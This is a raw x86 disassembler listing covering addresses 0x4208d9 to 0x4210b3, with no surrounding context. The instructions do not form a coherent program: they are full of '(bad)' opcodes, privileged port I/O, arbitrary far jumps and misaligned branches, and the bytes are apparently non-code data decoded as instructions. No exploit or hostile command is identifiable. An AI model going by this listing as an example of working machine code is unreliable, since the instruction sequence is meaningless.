  4208d9:	clts   
  4208db:	xchg   edi,eax
  4208dc:	ins    BYTE PTR es:[edi],dx
  4208dd:	out    dx,al
  4208de:	pop    edi
  4208df:	mov    bl,0x61
  4208e1:	xchg   ebx,eax
  4208e2:	mov    DWORD PTR [edi+0x6ff08686],ebx
  4208e8:	add    eax,0x1489bbfa
  4208ed:	xchg   edx,eax
  4208ee:	inc    esp
  4208ef:	(bad)  [edx-0x6b]
  4208f2:	retf   0x914
  4208f5:	test   al,0x69
  4208f7:	mov    ds:0xf1074385,al
  4208fc:	popa   
  4208fd:	pop    edx
  4208fe:	lea    ecx,[edi+eax*2-0x50d3c09f]
  420905:	arpl   WORD PTR [ecx+0x54],si
  420908:	and    eax,0x7d0d96a4
  42090d:	imul   ebp,DWORD PTR [ecx-0x8adce7c],0x44
  420914:	fmul   DWORD PTR [edi-0x61]
  420917:	mov    edx,0x43051f0b
  42091c:	inc    esi
  42091d:	gs leave 
  42091f:	add    eax,0x6dea0d4
  420924:	inc    ebx
  420925:	sub    BYTE PTR [ebp+0x10],bl
  420928:	adc    eax,DWORD PTR [ecx+ebp*8-0x4d]
  42092c:	push   esi
  42092d:	data16 aad 0x94
  420930:	loop   0x4209a8
  420932:	lods   al,BYTE PTR ds:[esi]
  420933:	sbb    BYTE PTR cs:[edx-0x2260cfd8],dh
  42093a:	test   DWORD PTR ds:0xaf8a622a,edx
  420941:	dec    ebx
  420942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420943:	mov    ds:0xea564b75,eax
  420948:	ja     0x42097b
  42094a:	ret    
  42094b:	push   ds
  42094c:	xchg   ebx,eax
  42094d:	cmp    DWORD PTR [eax-0x26174bb3],0xe2138380
  420957:	jle    0x420935
  420959:	push   esi
  42095a:	outs   dx,BYTE PTR ds:[esi]
  42095b:	and    eax,ebx
  42095d:	mov    ss,WORD PTR [edi-0x60f50768]
  420963:	and    ecx,ebx
  420965:	push   edx
  420966:	mov    edi,0x7babc9d1
  42096b:	jge    0x42090f
  42096d:	out    dx,al
  42096e:	(bad)  
  42096f:	xchg   ebp,eax
  420970:	lods   al,BYTE PTR ds:[esi]
  420971:	ret    
  420972:	sub    al,0xaf
  420974:	iret   
  420975:	add    al,0xc2
  420977:	push   0xe937e2d1
  42097c:	(bad)  
  42097d:	dec    esi
  42097e:	nop
  42097f:	adc    DWORD PTR [ecx+ebp*1-0x78],0x1d8b4dcb
  420987:	push   0x63
  420989:	sub    al,0x16
  42098b:	adc    cl,0x6d
  42098e:	popa   
  42098f:	cwde   
  420990:	pusha  
  420991:	je     0x4209f4
  420993:	mov    ecx,0x5c09338e
  420998:	xchg   DWORD PTR [ebx+0x51],edx
  42099b:	cld    
  42099c:	pop    es
  42099d:	test   DWORD PTR [ebp+0x2593f043],ebp
  4209a3:	ret    0x5b19
  4209a6:	call   0x4384a117
  4209ab:	inc    esi
  4209ac:	xchg   edx,eax
  4209ad:	enter  0xe990,0xf8
  4209b1:	xor    BYTE PTR [ebp+0x57],cl
  4209b4:	test   DWORD PTR fs:[esi-0x1a],edx
  4209b8:	in     al,dx
  4209b9:	dec    esp
  4209ba:	or     BYTE PTR [edi+0x14],dh
  4209bd:	sbb    ebp,DWORD PTR [edi+ecx*2]
  4209c0:	adc    al,0x1b
  4209c2:	cmp    ecx,DWORD PTR ds:0xc75425bc
  4209c8:	sub    eax,0x1728ef3
  4209cd:	test   BYTE PTR [ecx+0x9],cl
  4209d0:	add    esi,eax
  4209d2:	mov    edx,0x140f00
  4209d7:	push   es
  4209d8:	inc    ecx
  4209d9:	rcr    BYTE PTR [ebx],0x27
  4209dc:	loopne 0x4209fb
  4209de:	sbb    BYTE PTR [esp+ecx*1],bl
  4209e1:	sbb    DWORD PTR [esi],edi
  4209e3:	mov    edi,esp
  4209e5:	jecxz  0x420a39
  4209e7:	rcl    BYTE PTR [edx],0xeb
  4209ea:	dec    ch
  4209ec:	ins    BYTE PTR es:[edi],dx
  4209ed:	or     al,0x33
  4209ef:	lds    edx,FWORD PTR [esi]
  4209f1:	jbe    0x4209c4
  4209f3:	ficom  DWORD PTR [ebp+0x59]
  4209f6:	out    0xb4,al
  4209f8:	and    eax,0xe609a04b
  4209fd:	mov    ah,0xdc
  4209ff:	jns    0x420a52
  420a01:	data16 lahf 
  420a03:	fstp   DWORD PTR [ebx]
  420a05:	je     0x420a6b
  420a07:	aas    
  420a08:	ins    BYTE PTR es:[edi],dx
  420a09:	mov    al,ds:0xe7d73fb6
  420a0e:	loopne 0x420a3e
  420a10:	mov    dh,0xe1
  420a12:	or     eax,DWORD PTR [edx+0x47f16e2e]
  420a18:	jo     0x420a6f
  420a1a:	and    BYTE PTR [edx+0x14cb4f96],ah
  420a20:	jge    0x4209b2
  420a22:	jmp    DWORD PTR [ebp-0x69bf938]
  420a28:	jno    0x4209f2
  420a2a:	nop
  420a2b:	div    dh
  420a2d:	and    ecx,DWORD PTR [esi+eiz*2+0x66]
  420a31:	sbb    BYTE PTR ds:0xbd058719,bl
  420a37:	or     BYTE PTR [ebp+0x1642ab58],dh
  420a3d:	and    eax,0xda603396
  420a42:	hlt    
  420a43:	fscale 
  420a45:	push   0x9f34a84b
  420a4a:	out    0x23,eax
  420a4c:	add    BYTE PTR [eax-0x3],bl
  420a4f:	jne    0x420a21
  420a51:	push   es
  420a52:	in     eax,0x20
  420a54:	nop
  420a55:	int3   
  420a56:	bound  edx,QWORD PTR [ecx+0xf12f00]
  420a5c:	add    DWORD PTR [ecx],ebx
  420a5e:	loopne 0x420acd
  420a60:	xor    eax,0x58af60d4
  420a65:	jbe    0x420a80
  420a67:	xor    al,0x1c
  420a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a6a:	or     al,0xa9
  420a6c:	out    0x48,eax
  420a6e:	mov    BYTE PTR [ebp-0x25e406d3],ah
  420a74:	lock (bad) 
  420a76:	jecxz  0x420aa2
  420a78:	mov    ah,0x38
  420a7a:	fild   QWORD PTR [eax-0x779b959d]
  420a80:	add    BYTE PTR [esi-0x5e],ah
  420a83:	int3   
  420a84:	ds cwde 
  420a86:	sbb    BYTE PTR [esi+0x662e0cb1],cl
  420a8c:	repz push ebp
  420a8e:	sbb    BYTE PTR [ecx+eax*1+0x76],dh
  420a92:	in     al,0xe2
  420a94:	mov    bl,dh
  420a96:	cdq    
  420a97:	fisttp DWORD PTR [ecx]
  420a99:	jp     0x420adc
  420a9b:	fisubr WORD PTR [edi+0x538d32cd]
  420aa1:	inc    esi
  420aa2:	pop    esi
  420aa3:	mov    edx,0x85e10478
  420aa8:	cs push ss
  420aaa:	gs mov dh,0x83
  420aad:	add    BYTE PTR [ecx],ah
  420aaf:	arpl   ax,cx
  420ab1:	mov    ebx,0x76ddfb79
  420ab6:	iret   
  420ab7:	retf   0xd5eb
  420aba:	fwait
  420abb:	pop    esi
  420abc:	mov    al,ss:0xbaef025d
  420ac2:	add    al,0x6f
  420ac4:	sbb    cl,dh
  420ac6:	scas   eax,DWORD PTR es:[edi]
  420ac7:	or     eax,0xd535ac00
  420acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420acd:	xchg   ebp,eax
  420ace:	pop    edi
  420acf:	pop    es
  420ad0:	idiv   DWORD PTR [eax+0x2d]
  420ad3:	xchg   BYTE PTR [eax+0x7e],bl
  420ad6:	or     DWORD PTR [edx],ebp
  420ad8:	adc    DWORD PTR [edi+0x52],ebx
  420adb:	out    0x95,al
  420add:	outs   dx,DWORD PTR ds:[esi]
  420ade:	cmp    bh,BYTE PTR [ecx+0x8]
  420ae1:	out    dx,eax
  420ae2:	stos   DWORD PTR es:[edi],eax
  420ae3:	and    eax,0x837142d5
  420ae8:	or     BYTE PTR [eiz*4+0x7ab65ba5],bl
  420aef:	(bad)  
  420af0:	pop    esi
  420af1:	mov    dh,BYTE PTR [ebp-0x50f99e8f]
  420af7:	jmp    0xa73d4edb
  420afc:	or     BYTE PTR [esi-0x59e6e511],0x9f
  420b03:	out    dx,al
  420b04:	push   ebx
  420b05:	push   esp
  420b06:	jns    0x420aa2
  420b08:	je     0x420b7a
  420b0a:	and    al,0xda
  420b0c:	repz fistp DWORD PTR [edx+ebp*1+0x4d]
  420b11:	nop
  420b12:	xor    al,0x50
  420b14:	adc    ah,BYTE PTR [edi-0x38]
  420b17:	dec    eax
  420b18:	icebp  
  420b19:	xchg   BYTE PTR [eax],bl
  420b1b:	inc    ecx
  420b1c:	and    BYTE PTR [eax],0x30
  420b1f:	push   ds
  420b20:	mov    WORD PTR [ecx-0x5a1e9527],fs
  420b26:	popf   
  420b27:	xor    al,BYTE PTR [edx-0x4b]
  420b2a:	mov    edx,0x496ab4a2
  420b2f:	xor    BYTE PTR ds:0xdf4a4255,dl
  420b35:	aas    
  420b36:	xchg   edx,eax
  420b37:	inc    ebx
  420b38:	xchg   ecx,eax
  420b39:	xchg   esi,eax
  420b3a:	cmp    al,0x27
  420b3c:	icebp  
  420b3d:	add    al,0xec
  420b3f:	les    ebx,FWORD PTR [ecx]
  420b41:	sub    ch,BYTE PTR [edx-0x70]
  420b44:	gs push 0xffffffd3
  420b47:	(bad)  
  420b48:	adc    al,0x26
  420b4a:	and    DWORD PTR [ebx+0x78],edx
  420b4d:	pop    ebx
  420b4e:	test   eax,0x2b489b05
  420b53:	fidivr WORD PTR gs:[esi+0x7cbacb6c]
  420b5a:	pop    es
  420b5b:	repz in al,dx
  420b5d:	popf   
  420b5e:	ins    DWORD PTR es:[edi],dx
  420b5f:	adc    DWORD PTR [ebx],eax
  420b61:	lahf   
  420b62:	imul   edx,DWORD PTR [esi+0x5d3fc555],0x5216e289
  420b6c:	lds    eax,FWORD PTR [ebx+0x5af98454]
  420b72:	xchg   DWORD PTR [esi],edx
  420b74:	fild   WORD PTR [esi-0x73]
  420b77:	jle    0x420b66
  420b79:	cmp    BYTE PTR fs:[ecx+0x2997d6d6],ah
  420b80:	pop    eax
  420b81:	jecxz  0x420baf
  420b83:	fild   WORD PTR [edx]
  420b85:	sub    eax,0xf1fa76db
  420b8a:	jg     0x420bba
  420b8c:	jmp    0x420b9a
  420b8e:	sub    BYTE PTR [edx+edx*8+0x5e],cl
  420b92:	xlat   BYTE PTR ds:[ebx]
  420b93:	data16 jecxz 0x420b4e
  420b96:	test   BYTE PTR [edi+edi*2],dl
  420b99:	mov    esi,0x2868c6d6
  420b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ba0:	std    
  420ba1:	push   cs
  420ba2:	rcl    ecx,cl
  420ba4:	lea    ecx,[ecx-0x59469cdb]
  420baa:	mov    dl,0x49
  420bac:	sbb    al,0x29
  420bae:	aam    0xd8
  420bb0:	ds sbb eax,0xa28b9f9c
  420bb6:	dec    eax
  420bb7:	jo     0x420baa
  420bb9:	shr    DWORD PTR [edx-0xea9b062],1
  420bbf:	fmul   QWORD PTR [edx+0x9]
  420bc2:	sti    
  420bc3:	fnstenv [eax]
  420bc5:	jp     0x420bd3
  420bc7:	inc    eax
  420bc8:	add    BYTE PTR [eax-0x5],al
  420bcb:	call   0x80a:0x1e016b83
  420bd2:	les    edi,FWORD PTR [eax+eiz*1]
  420bd5:	xor    dl,dl
  420bd7:	pop    es
  420bd8:	or     BYTE PTR [ecx-0x3261a082],0xb
  420bdf:	dec    esi
  420be0:	out    0x87,al
  420be2:	jnp    0x420bed
  420be4:	jl     0x420bd5
  420be6:	stos   DWORD PTR es:[edi],eax
  420be7:	retf   0x7b8
  420bea:	std    
  420beb:	jns    0x420bbf
  420bed:	jge    0x420b88
  420bef:	retf   0x51cd
  420bf2:	shr    DWORD PTR ds:0xbb1c8171,0x67
  420bf9:	lea    eax,[ebp+0x41]
  420bfc:	inc    ebp
  420bfd:	call   0xbe6b34ab
  420c02:	js     0x420c25
  420c04:	pop    ds
  420c05:	mov    dh,0x45
  420c07:	(bad)  
  420c08:	adc    esi,DWORD PTR [eax-0x4d5e5063]
  420c0e:	jge    0x420bb5
  420c10:	pop    ss
  420c11:	push   ebx
  420c12:	inc    ebp
  420c13:	jns    0x420c1d
  420c15:	test   al,0x92
  420c17:	fs fs sub eax,0x1cc2d746
  420c1e:	sti    
  420c1f:	ja     0x420c5c
  420c21:	sbb    edi,0xb72e5025
  420c27:	jp     0x420c7c
  420c29:	scas   eax,DWORD PTR es:[edi]
  420c2a:	mov    dl,0x60
  420c2c:	stos   BYTE PTR es:[edi],al
  420c2d:	dec    ebp
  420c2e:	inc    ebp
  420c2f:	xchg   esp,eax
  420c30:	mov    cl,0xa0
  420c32:	and    bl,bl
  420c34:	stos   BYTE PTR es:[edi],al
  420c35:	inc    ebp
  420c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c37:	ins    DWORD PTR es:[edi],dx
  420c38:	bnd jns 0x420c6f
  420c3b:	out    0xd4,al
  420c3d:	popa   
  420c3e:	mov    esp,DWORD PTR [eax-0x20]
  420c41:	and    esp,DWORD PTR [ebx+0x3f9f9534]
  420c47:	call   0xa561:0x110cc21c
  420c4e:	push   ecx
  420c4f:	and    eax,DWORD PTR [eax]
  420c51:	stc    
  420c52:	xchg   ebp,eax
  420c53:	retf   
  420c54:	and    BYTE PTR [ecx-0x1f5ccdfe],dh
  420c5a:	mov    ds:0x418384fc,eax
  420c5f:	clc    
  420c60:	jmp    0x97d88067
  420c65:	push   ecx
  420c66:	and    eax,0xcbd7a943
  420c6b:	sbb    BYTE PTR [edx],bl
  420c6d:	sbb    DWORD PTR [ebx-0x5d],eax
  420c70:	sub    ecx,DWORD PTR [ecx+0x35288262]
  420c76:	call   0x8299:0x67f50948
  420c7d:	add    al,0xa2
  420c7f:	and    DWORD PTR [edx],eax
  420c81:	jo     0x420c0c
  420c83:	outs   dx,BYTE PTR ds:[esi]
  420c84:	mov    ds:0xb647564f,al
  420c89:	jmp    0x420cef
  420c8b:	sub    al,BYTE PTR [ecx+0x64]
  420c8e:	and    eax,0x1edd021f
  420c93:	aas    
  420c94:	add    DWORD PTR [eax-0x24],eax
  420c97:	(bad)  
  420c98:	xchg   edi,eax
  420c99:	pop    ebx
  420c9a:	xor    eax,0xc1ee84bc
  420c9f:	int    0x8d
  420ca1:	sahf   
  420ca2:	dec    esi
  420ca3:	ins    BYTE PTR es:[edi],dx
  420ca4:	xchg   esi,eax
  420ca5:	mov    al,0x68
  420ca7:	ss jmp 0x818a:0xfafec534
  420caf:	inc    esi
  420cb0:	fist   DWORD PTR [ebp+0x61]
  420cb3:	vaddsd xmm3,xmm6,QWORD PTR [ebp-0x3b]
  420cb8:	jmp    0x872f48a
  420cbd:	add    cl,BYTE PTR [edi]
  420cbf:	aaa    
  420cc0:	or     edi,eax
  420cc2:	xchg   ebp,eax
  420cc3:	add    DWORD PTR [eax-0x70],esp
  420cc6:	cs scas al,BYTE PTR es:[edi]
  420cc8:	in     eax,0xf3
  420cca:	mov    esp,DWORD PTR [edx-0x5eb00a71]
  420cd0:	mov    esp,DWORD PTR [edi-0x5f]
  420cd3:	out    0xa,eax
  420cd5:	rcl    BYTE PTR [ebp-0xa95be39],1
  420cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cdc:	or     DWORD PTR ds:0x4faa24bf,ecx
  420ce2:	mov    al,0x53
  420ce4:	out    0x8e,eax
  420ce6:	sbb    al,0x81
  420ce8:	dec    ebx
  420ce9:	jmp    0x420d48
  420ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cec:	shl    BYTE PTR [edx+eax*8+0x51],1
  420cf0:	mov    WORD PTR [esp+ecx*2-0x7dc66694],es
  420cf7:	pop    ss
  420cf8:	dec    edx
  420cf9:	fdivr  QWORD PTR [eax]
  420cfb:	push   esi
  420cfc:	pop    ss
  420cfd:	scas   eax,DWORD PTR es:[edi]
  420cfe:	mov    esp,0x96833c79
  420d03:	(bad)  
  420d04:	lds    edx,FWORD PTR [ebx+0x71]
  420d07:	gs push cs
  420d09:	mov    ecx,0xa512a549
  420d0e:	nop
  420d0f:	ror    ah,1
  420d11:	test   al,0xcf
  420d13:	scas   eax,DWORD PTR es:[edi]
  420d14:	push   es
  420d15:	test   BYTE PTR [edx+0x3b36b014],ch
  420d1b:	and    DWORD PTR [ebp-0x46],eax
  420d1e:	daa    
  420d1f:	xor    edx,esp
  420d21:	jle    0x420cba
  420d23:	push   esi
  420d24:	mov    ch,0xd3
  420d26:	ret    0xcdd9
  420d29:	or     bl,BYTE PTR [ecx+ecx*1]
  420d2c:	adc    eax,0x16f60bee
  420d31:	cli    
  420d32:	lahf   
  420d33:	fisttp WORD PTR [ecx]
  420d35:	inc    esi
  420d36:	lock adc DWORD PTR [edx],ecx
  420d39:	out    0xe,al
  420d3b:	cli    
  420d3c:	(bad)  
  420d3e:	jp     0x420d4b
  420d40:	xor    edx,DWORD PTR [esp+ebp*4-0x4f]
  420d44:	adc    BYTE PTR [ecx+0x6edb1520],cl
  420d4a:	je     0x420ce1
  420d4c:	lds    ebp,FWORD PTR [ebp-0x666107ae]
  420d52:	or     al,0x22
  420d54:	and    DWORD PTR [ecx-0x8],esi
  420d57:	adc    al,0x4
  420d59:	xchg   edi,eax
  420d5a:	iret   
  420d5b:	imul   esi,DWORD PTR [eax+0x34229be3],0x97574eb4
  420d65:	call   0x48bb:0x82dd10f8
  420d6c:	jg     0x420d1d
  420d6e:	(bad)  
  420d6f:	in     eax,0x6a
  420d71:	je     0x420d74
  420d73:	xor    BYTE PTR [ecx+edx*2+0x1c],0x96
  420d78:	arpl   WORD PTR [ecx+0x548a7f54],ax
  420d7e:	ds ret 0xac2
  420d82:	push   0x78c758a4
  420d87:	mov    ebx,0x3bb2a781
  420d8c:	pop    edi
  420d8d:	mov    ah,0x5c
  420d8f:	ret    0xa48f
  420d92:	or     eax,0x8e9f7809
  420d97:	inc    ebp
  420d98:	push   eax
  420d99:	and    eax,0x6e48acd5
  420d9e:	adc    BYTE PTR [edx],al
  420da0:	iret   
  420da1:	sub    DWORD PTR [ecx-0x37aef1d8],ecx
  420da7:	inc    ebx
  420da8:	sub    al,0x7f
  420daa:	mov    cl,dl
  420dac:	adc    DWORD PTR [edx+0x2ecddb30],esp
  420db2:	stos   BYTE PTR es:[edi],al
  420db3:	xor    bl,BYTE PTR [ebx+0x604b3ac0]
  420db9:	dec    edx
  420dba:	mov    ecx,DWORD PTR [edi+eiz*8+0x3c3ed28f]
  420dc1:	iret   
  420dc2:	push   edi
  420dc3:	(bad)  
  420dc4:	in     eax,0x34
  420dc6:	std    
  420dc7:	sti    
  420dc8:	jo     0x420dfe
  420dca:	add    edx,eax
  420dcc:	cmp    DWORD PTR [ecx],eax
  420dce:	hlt    
  420dcf:	push   0xffffffc0
  420dd1:	pop    edi
  420dd2:	mov    ch,0x7f
  420dd4:	xor    eax,0x131e808
  420dd9:	popf   
  420dda:	aas    
  420ddb:	inc    eax
  420ddc:	mov    ebx,0xc2b7d273
  420de1:	jmp    0x5f99:0xb0e88b7e
  420de8:	(bad)  
  420de9:	mov    ebp,0xcbc0a31d
  420dee:	sub    al,0x80
  420df0:	mov    DWORD PTR [edx],edi
  420df2:	xchg   ebp,eax
  420df3:	sub    al,0xce
  420df5:	mov    esi,0x6564756a
  420dfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dfb:	dec    ebx
  420dfc:	dec    ebx
  420dfd:	call   0xd4233dc4
  420e02:	push   esp
  420e03:	icebp  
  420e04:	sbb    dl,BYTE PTR ds:0x6efb08f7
  420e0a:	mov    cl,BYTE PTR [edi]
  420e0c:	cli    
  420e0d:	cmp    BYTE PTR [ebp-0x7],cl
  420e10:	lea    eax,[ebx+ebx*8]
  420e13:	push   esi
  420e14:	ffree  st(2)
  420e16:	mov    ch,0x54
  420e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e19:	ret    
  420e1a:	sar    BYTE PTR [esi+0x50],cl
  420e1d:	or     edx,DWORD PTR [edx]
  420e1f:	xchg   ecx,eax
  420e20:	gs aas 
  420e22:	add    eax,0x2a21b26d
  420e27:	xchg   edx,eax
  420e28:	or     al,0xce
  420e2a:	push   ss
  420e2b:	pop    ecx
  420e2c:	stos   BYTE PTR es:[edi],al
  420e2d:	mov    eax,ds:0xd9b61448
  420e32:	push   ebp
  420e33:	mov    bl,0x28
  420e35:	bound  esi,QWORD PTR [eax]
  420e37:	fs mov esp,0x24054645
  420e3d:	loope  0x420dc9
  420e3f:	cmp    BYTE PTR [ecx+0x43a3de49],al
  420e45:	adc    DWORD PTR es:[esi],edx
  420e48:	jne    0x420e3f
  420e4a:	leave  
  420e4b:	hlt    
  420e4c:	test   eax,0x868ac6a5
  420e51:	ret    0x2843
  420e54:	shl    BYTE PTR [edi+0x37],1
  420e57:	leave  
  420e58:	mov    ah,0x24
  420e5a:	sbb    edx,DWORD PTR [ebx-0x49]
  420e5d:	push   ebp
  420e5e:	arpl   WORD PTR [edi-0xb],bx
  420e61:	jmp    0x4374:0x359651c
  420e68:	repnz lds esp,FWORD PTR [edx]
  420e6b:	jmp    0x420e5b
  420e6d:	pusha  
  420e6e:	test   eax,0xf196c45c
  420e73:	xor    esp,edx
  420e75:	pop    eax
  420e76:	outs   dx,BYTE PTR ds:[esi]
  420e77:	pop    ds
  420e78:	shr    DWORD PTR [eax+0x48ab6cd6],0xcc
  420e7f:	je     0x420eb5
  420e81:	dec    eax
  420e82:	test   ebx,0xbe835351
  420e88:	mov    al,ds:0x6e22c38
  420e8d:	cwde   
  420e8e:	cwde   
  420e8f:	cmp    DWORD PTR [eax],edi
  420e91:	mov    edx,DWORD PTR [ebx]
  420e93:	jb     0x420ebe
  420e95:	sbb    cl,BYTE PTR [edx]
  420e97:	mov    dh,0x11
  420e99:	(bad)  
  420e9b:	ins    BYTE PTR es:[edi],dx
  420e9c:	mov    ecx,0x9f3f3689
  420ea1:	mov    al,ds:0xdf74bc82
  420ea6:	mov    ds:0xf576032,al
  420eab:	test   eax,esi
  420ead:	sub    bh,BYTE PTR [edx-0x2604d9e9]
  420eb3:	data16 arpl si,di
  420eb6:	mov    ah,0x43
  420eb8:	xor    BYTE PTR [ebx+0x58],ch
  420ebb:	dec    edx
  420ebc:	stc    
  420ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebe:	iret   
  420ebf:	push   ss
  420ec0:	mov    al,0x9a
  420ec2:	aam    0x45
  420ec4:	cwde   
  420ec5:	sbb    BYTE PTR [esi-0x7c6e2fdf],0xf
  420ecc:	ja     0x420e5a
  420ece:	rol    BYTE PTR [ebx+0x2],0x80
  420ed2:	sar    ecx,0x63
  420ed5:	ins    DWORD PTR es:[edi],dx
  420ed6:	and    DWORD PTR [ebp*8+0x227d83d7],esi
  420edd:	and    BYTE PTR [edi+0x7eea37a1],ah
  420ee3:	retf   
  420ee4:	push   esp
  420ee5:	push   ss
  420ee6:	out    dx,eax
  420ee7:	test   eax,0x7adef087
  420eec:	popf   
  420eed:	enter  0xc1da,0x9f
  420ef1:	push   eax
  420ef2:	xor    DWORD PTR [edi],edi
  420ef4:	retf   
  420ef5:	inc    esi
  420ef6:	std    
  420ef7:	dec    edi
  420ef8:	cli    
  420ef9:	push   DWORD PTR [ecx+0x53]
  420efc:	push   es
  420efd:	add    DWORD PTR [edx-0x36],0x82d1f3b7
  420f04:	lahf   
  420f05:	pop    eax
  420f06:	leave  
  420f07:	jecxz  0x420f42
  420f09:	hlt    
  420f0a:	mov    ecx,0x93c17d72
  420f0f:	addr16 (bad) 
  420f11:	mov    esi,0xa7ba6508
  420f16:	push   eax
  420f17:	xor    bh,BYTE PTR [edi]
  420f19:	ds push edi
  420f1b:	ins    DWORD PTR es:[edi],dx
  420f1c:	test   al,0xf9
  420f1e:	jle    0x420f39
  420f20:	test   al,0x9b
  420f22:	mov    al,BYTE PTR [esi-0x28]
  420f25:	pop    eax
  420f26:	adc    DWORD PTR fs:[esp+edx*4],edx
  420f2a:	cmp    edx,edx
  420f2c:	in     eax,0x1d
  420f2e:	push   ecx
  420f2f:	cli    
  420f30:	push   0xffffffd1
  420f32:	sub    BYTE PTR [edx+0x54e210be],dh
  420f38:	cld    
  420f39:	xchg   ebx,eax
  420f3a:	sbb    ah,BYTE PTR [ebp+0x74]
  420f3d:	enter  0x7e34,0xab
  420f41:	cvtps2pd xmm3,xmm5
  420f44:	aam    0x10
  420f46:	dec    BYTE PTR [edx-0xf6bcc80]
  420f4c:	sub    DWORD PTR [ebx-0x2f],ebp
  420f4f:	push   0x55a517d2
  420f54:	retf   0x5d2
  420f57:	adc    DWORD PTR [eax],esi
  420f59:	cmp    dh,BYTE PTR [edx+edx*2+0x67ddeb51]
  420f60:	test   al,0x88
  420f62:	daa    
  420f63:	mov    cl,0x82
  420f65:	ret    
  420f66:	icebp  
  420f67:	and    al,0x6e
  420f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f6a:	stos   DWORD PTR es:[edi],eax
  420f6b:	nop
  420f6c:	es inc eax
  420f6e:	xor    al,0xa9
  420f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f71:	jno    0x420f2e
  420f73:	dec    esi
  420f74:	mov    eax,ds:0xa527e1f1
  420f79:	ss pop esi
  420f7b:	dec    esp
  420f7c:	inc    ecx
  420f7d:	enter  0x52d3,0x18
  420f81:	adc    al,0x8a
  420f83:	cmp    al,0xeb
  420f85:	shl    DWORD PTR [edx-0x55],cl
  420f88:	into   
  420f89:	mov    bl,0xec
  420f8b:	jno    0x420f27
  420f8d:	out    dx,eax
  420f8e:	mov    bl,0x87
  420f90:	xchg   ecx,ebp
  420f92:	sti    
  420f93:	rcr    DWORD PTR [edx],cl
  420f95:	mov    ch,0x6d
  420f97:	push   edx
  420f98:	jl     0x420fad
  420f9a:	out    0x3b,eax
  420f9c:	jne    0x420f5a
  420f9e:	arpl   WORD PTR [ecx+0x75ff50a2],bp
  420fa4:	cmp    al,0xdf
  420fa6:	inc    ebp
  420fa7:	popa   
  420fa8:	std    
  420fa9:	nop
  420faa:	or     al,0x36
  420fac:	mov    ecx,0xa6c3d541
  420fb1:	dec    edi
  420fb2:	inc    esi
  420fb3:	rcr    cl,0xf9
  420fb6:	sub    al,0xcb
  420fb8:	xor    bl,BYTE PTR [ecx]
  420fba:	leave  
  420fbb:	xchg   esi,eax
  420fbc:	push   es
  420fbd:	test   eax,0x5471d6e8
  420fc2:	xchg   edi,eax
  420fc3:	jmp    0x420f82
  420fc5:	cmp    DWORD PTR [edi-0x59],esp
  420fc8:	aaa    
  420fc9:	addr16 std 
  420fcb:	daa    
  420fcc:	fs xor eax,0x96e50a51
  420fd2:	pop    esp
  420fd3:	sbb    ebx,edi
  420fd5:	fwait
  420fd6:	out    dx,al
  420fd7:	add    eax,eax
  420fd9:	and    DWORD PTR [esi+eiz*8+0x1abd004],ebp
  420fe0:	jg     0x420ff7
  420fe2:	add    BYTE PTR [eax],bl
  420fe4:	add    al,0x1
  420fe6:	cmp    eax,0x38a3a026
  420feb:	gs cmp al,0x40
  420fee:	iret   
  420fef:	or     cl,BYTE PTR [eax-0x1]
  420ff2:	or     cl,BYTE PTR [ebx]
  420ff4:	fmul   st,st(2)
  420ff6:	mov    ebx,DWORD PTR [edi+0x33aa91b0]
  420ffc:	push   ss
  420ffd:	rol    DWORD PTR [edi],0xe6
  421000:	std    
  421001:	fcomp  DWORD PTR [edi-0x4d]
  421004:	push   eax
  421005:	adc    eax,0xd037ed36
  42100a:	xor    ebx,eax
  42100c:	je     0x420fdf
  42100e:	sub    al,0x15
  421010:	cmp    BYTE PTR [edi+eax*8],dh
  421013:	repnz dec ebx
  421015:	or     BYTE PTR [eax-0x6c],dh
  421018:	lods   al,BYTE PTR ds:[esi]
  421019:	push   0x10febe99
  42101e:	jmp    0x421018
  421020:	dec    esi
  421021:	fidivr WORD PTR [ebp+ecx*8-0x380be531]
  421028:	setb   cl
  42102b:	in     eax,dx
  42102c:	and    al,0x68
  42102e:	dec    esp
  42102f:	repz mov ebp,0x1912322c
  421035:	jae    0x420fbb
  421037:	ret    0xacbb
  42103a:	aaa    
  42103b:	xchg   ebp,eax
  42103c:	xor    DWORD PTR [si],ebx
  42103f:	push   edi
  421040:	mov    WORD PTR [esp+ebx*1-0x57167575],es
  421047:	jmp    0x6d0d818b
  42104c:	mov    dl,0xa6
  42104e:	push   ss
  42104f:	int    0xe4
  421051:	push   0x7c28b7a4
  421056:	test   DWORD PTR [eax+0x48e5063],esp
  42105c:	mov    WORD PTR [ebp-0x13],fs
  42105f:	sbb    BYTE PTR [eax-0x12],0x8
  421063:	imul   edx,DWORD PTR [edx-0x7b8f380b],0x37
  42106a:	dec    ebp
  42106b:	mov    al,cl
  42106d:	imul   esi,DWORD PTR [esi],0x49699060
  421073:	ins    BYTE PTR es:[edi],dx
  421074:	inc    edx
  421075:	mov    bl,BYTE PTR [edi-0x3cceaf33]
  42107b:	shl    DWORD PTR [eax],1
  42107d:	inc    edx
  42107e:	add    al,0xa6
  421080:	pop    edx
  421081:	test   eax,0xd366d640
  421086:	fcomip st,st(7)
  421088:	stos   DWORD PTR es:[edi],eax
  421089:	test   eax,0x63122360
  42108e:	cmp    DWORD PTR [esp+0x28],ecx
  421092:	push   edi
  421093:	popa   
  421094:	call   0x48c8:0xb333df1
  42109b:	inc    esp
  42109c:	xor    al,BYTE PTR [bx+di+0x5e25]
  4210a1:	imul   esi,DWORD PTR [edx+0xafcfe6c],0xffffffb6
  4210a8:	ins    DWORD PTR es:[edi],dx
  4210a9:	sbb    al,BYTE PTR [ecx-0x42]
  4210ac:	aam    0xc0
  4210ae:	jmp    0x532d2a27
  4210b3:	inc    edi
